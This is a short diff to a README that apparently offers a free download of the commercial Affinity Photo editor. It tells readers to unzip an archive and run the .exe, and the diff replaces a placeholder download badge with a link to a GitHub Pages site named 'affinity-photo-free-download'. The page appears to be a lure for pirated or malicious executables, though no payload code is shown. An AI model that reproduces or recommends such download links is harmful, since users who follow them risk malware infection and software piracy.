@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://affinity-photo-free-download.github.io/.github/)
 
 ## 📸 Overview
   <img width="2560" height="1600" alt="affinity-photo-raw-processing" src="https://github.com/user-attachments/assets/3144357f-0383-421c-b34c-32dccdc20d12" />
